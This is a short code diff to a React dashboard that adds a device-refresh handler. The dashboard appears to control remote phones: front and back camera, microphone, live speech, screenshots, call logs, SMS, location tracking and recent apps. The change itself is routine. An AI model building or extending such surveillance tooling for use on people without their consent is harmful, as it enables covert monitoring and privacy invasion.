@@ -25,7 +25,7 @@ export default function Dashboard({ token, onLogout }) {
     cameraStartFront, cameraStartBack, cameraStopFront, cameraStopBack,
     liveSpeakStart, liveSpeakStop,
     micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS,
-    locationStart, locationStop, getRecentApps, renameDevice,
+    locationStart, locationStop, getRecentApps, renameDevice, refreshDevices,
   } = useSocket(token)
 
   // Reset camera button when hardware rejects it
@@ -77,6 +77,7 @@ export default function Dashboard({ token, onLogout }) {
           onSelect={setSelected}
           deviceNames={deviceNames}
           onRename={renameDevice}
+          onRefresh={refreshDevices}
         />
         <button className="logout-btn" onClick={onLogout}>Sign Out</button>
       </aside>
